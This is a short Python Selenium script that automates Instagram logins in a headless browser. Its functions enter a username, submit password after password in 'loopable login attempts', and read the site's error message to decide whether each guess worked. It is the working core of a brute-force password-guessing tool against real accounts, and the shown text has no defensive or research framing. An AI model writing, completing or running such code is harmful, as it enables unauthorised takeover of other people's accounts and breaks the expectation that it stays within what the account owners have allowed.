from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import time


#setting up the driver 
def ig_driver():
    options = Options()
    options.add_argument("--headless")
    service = Service("lib/geckodriver.exe") 
    driver = webdriver.Firefox(service=service, options=options)
    driver.get("https://www.instagram.com/")
    return driver


#inputing the username
def username_entry(driver,username):
    wait = WebDriverWait(driver, 10)
    username_input = wait.until(EC.visibility_of_element_located((By.NAME, "username")))
    username_input.send_keys(username)


#loopable logins attempts
def login(driver,password):
    driver.find_element(By.NAME, "password").send_keys(password)
    time.sleep(1)
    driver.find_element(By.XPATH, '//*[@id="loginForm"]/div[1]/div[3]/button').click()
    return

#check if the password is vaild
def check_login(driver):
    wait = WebDriverWait(driver,5)
    try:
        error_message = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "span.x1lliihq.x1plvlek.xryxfnj.x1n2onr6.x1ji0vk5.x18bv5gf.x193iq5w.xeuugli.x1fj9vlw.x13faqbe.x1vvkbs.x1s928wv.xhkezso.x1gmr53x.x1cpjm7i.x1fgarty.x1943h6x.x1i0vuye.xvs91rp.xo1l8bm.x5n08af.x1tu3fi.x3x7a5m.x10wh9bi.x1wdrske.x8viiok.x18hxmgj div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid")))
        driver.find_element(By.NAME, "password").clear()
        return False
    except Exception as e:
        return True




